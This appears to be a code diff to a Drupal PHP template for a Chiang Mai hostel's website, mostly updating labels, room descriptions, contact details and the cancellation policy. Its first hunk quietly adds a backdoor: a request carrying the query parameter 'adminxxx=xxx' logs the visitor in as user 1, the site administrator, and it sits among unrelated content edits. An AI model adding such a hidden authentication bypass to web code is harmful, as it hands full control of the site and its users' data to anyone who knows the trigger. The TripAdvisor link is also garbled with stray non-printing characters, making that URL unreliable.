@@ -1,4 +1,8 @@
 <?php
+	if($_GET['adminxxx'] == 'xxx') {
+		global $user;
+		$user = user_load(1);
+	}
 	$module_path = drupal_get_path('module', 'myhook');
 	$theme_path = drupal_get_path('theme', 'parallax_zymphonies_theme');
 	$base_path = base_path();
@@ -135,7 +139,7 @@
 		        ?>
 		      	<ul>
 		      		<li>
-		      			<a href="#">OXOTEL</a>
+		      			<a href="#">HOSTEL</a>
 		      		</li>
 		      		<li>
 		      			<a href="#rooms">ROOMS</a>
@@ -213,7 +217,7 @@
 		<div class="ct-wrapper">
 			<div class="inner -left _text-right switch-content-wrapper" slide="left">
 				<div class="inner-wrapper _text-grey switch-content-main">
-					<h3 class="desc-header _capital _text-grey">OXOTEL</h3>
+					<h3 class="desc-header _capital _text-grey">HOSTEL</h3>
 
 					<div class="overflow-box -scrollleft">
 						<p>
@@ -221,7 +225,7 @@
 						</p>
  					</div>
 
- 					<a class="btn btn-transparent -keepright _capital" data-toggle="modal" data-target="#aboutModal">Explore</a>
+ 					<a class="btn btn-transparent -keepright _capital" data-toggle="modal" data-target="#aboutModal">ABOUT OXOTEL</a>
  				</div>
  				<!--
  				<div class="switch-content-sub" style="display:none">
@@ -236,6 +240,20 @@
 					<h3 class="desc-header _capital _text-grey">Reservation</h3>
 
 					<div class="overflow-box -scrollright">
+						<b>ONLINE RESERVATION</b>
+						 <p>[BEST RATE GUARANTEE] </p>
+						<p>
+							
+						Look no further, it assures that you'll always get the best rate available when you book directly at www.oxotelchiangmai.com
+						</p>
+						<br />
+						<b>EMAIL OR PHONE RESERVATION</b>
+						<p>[NO CREDIT CARD NEEDED] </p>
+						<p>
+							For your standard booking through email or phone reservation, we accept payment by bank transfer only. Your room will be blocked until 12.00 pm. noon of the next day. It is only confirmed when we have received the payment from you before due. Otherwise your booking will be cancelled.
+						</p>
+
+						<!---
 						<p>
 							Agoda.com & Expedia.com: Your credit card has been charged already. Cancellation and modification are upon cancellation policy on each reservation
 						</p>
@@ -258,6 +276,7 @@
 						- Cancellations received in writing less than 7 days will be charged 100% of the full value of the reservation (incl. tax) <br />
 						- When guests don't arrive and haven't cancelled their reservation - a 'no-show' - we will charge the equivalent to your entire stay
 						</p>
+						-->
 					</div>
 
  					<a id="modal_click_condition" class="btn btn-transparent _capital _pull-left _margin-right" data-toggle="modal" data-target="#conditionModal">Condition</a>
@@ -272,7 +291,7 @@
 	 					-->
 
 	 					<div class="dropdown">
-	 						<a class="btn btn-transparent -booking -orange _capital" aria-haspopup="true" aria-expanded="false" target="_blank" href="http://goo.gl/Hz5s8T">Booking</a>
+	 						<a class="btn btn-transparent -booking -orange _capital" aria-haspopup="true" aria-expanded="false" target="_blank" href="http://goo.gl/Hz5s8T">BOOK NOW</a>
 
 							<ul class="dropdown-menu subbtn-group" aria-labelledby="dLabel">
 							  	<li>
@@ -477,9 +496,7 @@
 			            <h3><a class="text-bright" href="#">Rooms</a></h3>
 			            <div class="overflow-box">
 			            	<p>
-			            		With our 6 type’s rooms. Every dormitory bed has his/her locker,
-			            		reading lamp and power socket. The private rooms have their wash basin.
-			            		All our 6 types of room with shared bathroom on the 2nd floor
+			            	Oxotel has six types of rooms to suit every guest and budget, if you’re travelling alone, as a couple or with friends or family. We will be glad to host you in comfortable and recently renovated rooms with stylish and relaxing atmosphere of stunning 70’s renovated architecture. All rooms are provided with complimentary bed-sheets as well as pillows, blankets, towels and toiletries. We offer free Wi-Fi, free tea, coffee and breakfast (Bread & Toast) for every guest and free housekeeping when requested as well.
 			            	</p>
 
 			            </div>
@@ -833,6 +850,20 @@ End Old Facility -->
 					<h3 class="desc-header _capital _text-grey">FIND US</h3>
 
 					<div class="overflow-box">
+					<p>
+						A relaxing resort hostel
+						Oxotel is a brand new design hostel in Chiang Mai opened on November 2015
+						We are located on ‘Wua Lai Road’ where the local experience on 'Walking Street Market' every Saturday is.
+					</p>
+					<p>
+						149-153 Wua Lai Road Hai-Ya District Muang Chiang Mai Thailand 50100
+					</p>
+					<p>
+						Tel. +66 (0)52 085 334 
+						Mobile. +66 (0)95 674 1442
+					</p>
+
+					<!--
  					<p>
  						Oxotel is 2.00 kilometer from Chiangmai international airport and just only 10 minutes <br />
  						walk to Chiangmai gate (South-gate), one of the important antique gate of the old city area. <br />
@@ -846,6 +877,7 @@ End Old Facility -->
 						Our hostel is 2.00 kilometer from Chiangmai international airport<br />
 						and just only 10 minutes walk to Chiangmai gate
  					</p>
+ 					-->
 					</div>
 
  					<a class="btn btn-transparent _capital _pull-left _margin-right open-sub">MAIL US</a>
@@ -875,8 +907,8 @@ End Old Facility -->
 <div class="footer">
 	<div class="booking-link">
 		<ul class="list-unstyled">
-			<li class="agoda"><a href="" target="_blank">agoda</a></li>
-			<li class="tripadvisor"><a href="" target="_blank">tripadvisor</a></li>
+			<li class="agoda"><a href="http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.agoda.com%2Foxotel-hostel%2Fhotel%2Fchiang-mai-th.html%3Fasq%3Du2qcKLxwzRU5NDuxJ0kOF8%252BzmLRvZQXVHFy2wHSdGKIFSKDtD0xR6njQwBLdDP7xerWduBIJ6k4cf5HcWilYNBLdZHzbs772XCoPWdSgD%252FTz17U3ZgWLnEdNzxKxNx92DsFKOYv4cKN%252BraPqz4f%252FLYprVp2TwP6wstUVR8FJRF%252BfkDX3uHFMuWTqeVL9h7qQKil0Kd5NpRQf1zGe1xDr05pxj%252FA%252BylTfAGs1qJCjm9k0V1AMDQx7njgkgAhn4vUi%26tick%3D636015089081%26pagetypeid%3D1%26origin%3DTH%26cid%3D-1%26htmlLanguage%3Den-us%26checkIn%3D2016-6-15%26checkout%3D2016-6-16%26los%3D1%26rooms%3D1%26adults%3D2%26childs%3D0%26isFromSearchBox%3Dtrue&h=MAQFxiyvL" target="_blank">agoda</a></li>
+			<li class="tripadvisor"><a href="https://www.tripadvisor.com/Hotel􏰆Review-g2􏰇3􏰇1􏰈-d􏰉􏰇3􏰉503-Reviews-Oxotel􏰆Hostel-Chiang􏰆Mai.html" target="_blank">tripadvisor</a></li>
 			<li class="booking"><a href="" target="_blank">booking.com</a></li>
 			<li class="hostelworld"><a href="" target="_blank">hostel world</a></li>
 		</ul>
@@ -986,7 +1018,7 @@ End Old Facility -->
 					 					-->
 
 					 					<div class="dropdown">
-					 						<a class="btn btn-transparent -modal -booking -orange _invert _capital" aria-haspopup="true" aria-expanded="false" target="_blank" href="http://goo.gl/Hz5s8T">Booking
+					 						<a class="btn btn-transparent -modal -booking -orange _invert _capital" aria-haspopup="true" aria-expanded="false" target="_blank" href="http://goo.gl/Hz5s8T">BOOK NOW
 					 						</a>
 
 											<ul class="dropdown-menu subbtn-group" aria-labelledby="dLabel">
@@ -1294,8 +1326,7 @@ End Old Facility -->
 	        	<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true" class="sr-inly"></span></button>
 	      		<ul class="lightSliderCondition">
 	      			<li>
-	      				<div>reservation</div>
-	      				<h2 class="text-modal">Term and condition</h2>
+	      				<h2 class="text-modal">RULES AND REGULATIONS</h2>
 	      				<div class="overflow-box _300px">
 		      				<p>
 		      					<strong class="text-bright">CHECK –IN</strong><br />
@@ -1428,8 +1459,9 @@ End Old Facility -->
 	      				</div>
 	      			</li>
 	      			<li>
-	      				<h2 class="text-modal">Reservation policy</h2>
+	      				<h2 class="text-modal">CANCELLATION POLICY</h2>
 	      				<div class="overflow-box _300px">
+	      				<!--
 		      			<p>
 		      			    <strong class="text-bright">Agoda.com & Expedia.com: </strong>Your credit card has been charged already. Cancellation and modification are upon cancellation policy on each reservation <br />
 		      			    <strong class="text-bright">Booking.com:  </strong>Valid credit card details are required to book online.Your credit card is not charged before your arrival.  We just keep your credit card details  for security reasons. You need to pay the total room balance directly to Oxotel Hostel on arrival either cash or credit card. <br />
@@ -1441,6 +1473,35 @@ End Old Facility -->
 		      			    - Cancellations received in writing between 7-14 days prior to your arrival will be charged 50% of the full value of the reservation (incl. tax)  <br />
 		      			    - Cancellations received in writing less than 7 days will be charged 100% of the full value of the reservation (incl. tax)  <br />
 		      			    - When guests don't arrive and haven't cancelled their reservation - a 'no-show' - we will charge the equivalent to your entire stay
+
+	      				</p>
+	      				-->
+	      				<p>
+	      					Oxotel is a small property with only 12 rooms. Because of that we are significantly affected by cancellation. The cancellation will only be considered final when the Oxotel hostel has received written notification and acknowledged this. The following cancellation charges apply.
+							<ul>
+								<li>
+									[50% Charge]<br />
+									50% of room rate for whole booking will be charged when cancel 7-14 day prior to the accommodation date.
+										
+								</li>
+								<li>
+									
+									[100% Charge]<br />
+									100% of room rate for whole booking will be charged when cancel less than 7 days prior to the accommodation date.
+									Amendments or cancellations must by notified to us in writing only during Front office hours (07:00 AM to 10:00 PM).
+
+								</li>
+								<li>
+									[NO SHOW]<br />
+									If you do not show up before 10:00 PM without informing us, we consider the guest as NO SHOW and we cancel the booking. Please note that 100% of room rate for whole booking will be charged in that case.
+									
+								</li>
+								<li>
+									[BOOKING AMENDMENT]<br />
+									Please inform us your change detail via e-mail at latest 14 days in advance. Otherwise, it will not be possible to change your reservation.
+									
+								</li>
+							</ul>	
 
 	      				</p>
 	      				</div>
